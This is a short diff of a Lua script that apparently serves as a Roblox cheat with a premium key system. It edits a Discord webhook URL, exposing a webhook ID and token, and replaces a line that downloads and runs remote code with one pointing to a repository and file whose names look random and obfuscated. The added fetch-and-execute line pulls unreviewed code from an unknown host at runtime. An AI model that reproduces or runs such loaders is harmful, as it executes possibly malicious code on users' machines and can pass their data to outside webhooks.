@@ -2186,12 +2186,12 @@ if v16 == 'whitelisted' and v17 then
                     color = tonumber(3538690),
                 },
             },
-        }, 'https://discord.com/api/webhooks/1342163377434267731/FIb_nL2OtTByg4ThwlemA277W5TMeO3JhOQxWuo5gadsvWj6XYT_85tGbR3DawN7f_ds')
+        }, 'https://discord.com/api/webhooks/1342163377434267731/FIb_nL2OtTByg4ThwlemA277W5TMeO3JhOQxWuo5gadsvWepteindiddybludds')
     end
 
     getgenv().PremiumKeyRegisterDate = _G.CreationDate
     getgenv().PremiumKeyExpireDate = _G.EndDate
 
     v18()
-    loadstring(game:HttpGet('https://raw.githubusercontent.com/BlizTBr/scripts/main/FTAP.lua'))()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/qquzi/aynJIGo3UDGSadgAEbd6fAqu6jtmzjBye9NRnPdvL0sCrrVutEoQKRLPyM0NIEc7KG4v0w9KMB3a3Y1SJsPbgDIw2KkIk2xp6PKH/refs/heads/main/7NuyKgfof9Zzbr7jMZV9JiUiNWC5e8cLbR4PqfIhSejEtQO7mkgvYkdKzmLI1xAu9WUqPdrKWp5NzsCcuRt1NuEHe7L0QMHnxrHf.lua'))()
 end
